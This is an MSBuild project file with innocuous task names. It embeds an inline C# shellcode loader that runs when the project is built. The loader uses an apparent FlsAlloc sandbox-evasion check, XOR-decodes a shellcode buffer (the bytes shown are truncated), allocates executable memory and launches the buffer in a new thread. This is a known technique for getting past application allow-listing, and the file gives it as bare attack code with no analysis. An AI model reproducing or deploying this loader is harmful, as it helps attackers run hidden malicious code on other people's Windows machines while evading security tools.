<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
   <ClassExample />
  </Target>
    <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
     <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
     <!-- Your PowerShell Path May vary -->
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            using System.Diagnostics;
            using System.Runtime.InteropServices;
            using System.Net;
            using System.Text;
            using System.Threading;

                public class ClassExample : Task, ITask
                {
                    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                    [DllImport("kernel32.dll")]
                    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

                    [DllImport("kernel32.dll")]
                    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

                    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                    static extern UInt32 FlsAlloc(IntPtr lpCallback);

                    public static void Main(string[] args)
                    {

                        UInt32 result = FlsAlloc(IntPtr.Zero);
                        if (result == 0xFFFFFFFF)
                        {
                            return;
                        }


                        byte[] buf = new byte[808] { 0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,.....};
                        for (int i = 0; i < buf.Length; i++)
                        {
                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        int size = buf.Length;

                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                        Marshal.Copy(buf, 0, addr, size);

                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        WaitForSingleObject(hThread, 0xFFFFFFFF);


                    }
                public override bool Execute()
                {
                      
                    Main(new string[0]);
                    return true;

                }  
                }

                            
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
            
